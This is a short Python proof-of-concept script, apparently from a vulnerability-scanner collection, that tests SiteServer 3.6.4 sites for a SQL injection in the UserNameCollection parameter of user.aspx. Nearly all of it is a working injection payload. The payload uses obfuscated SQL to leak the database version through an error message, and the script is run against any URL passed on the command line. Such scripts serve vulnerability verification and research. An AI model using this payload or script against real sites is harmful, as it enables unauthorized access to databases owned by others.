#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: siteserver3.6.4 user.aspx注入
referer: http://www.wooyun.org/bugs/wooyun-2013-043535
author: Lucifer
description: 文件/usercenter/platform/user.aspx中,参数UserNameCollection存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class siteserver_UserNameCollection_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIon>0--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在siteserver3.6.4 user.aspx注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = siteserver_UserNameCollection_sqli_BaseVerify(sys.argv[1])
    testVuln.run()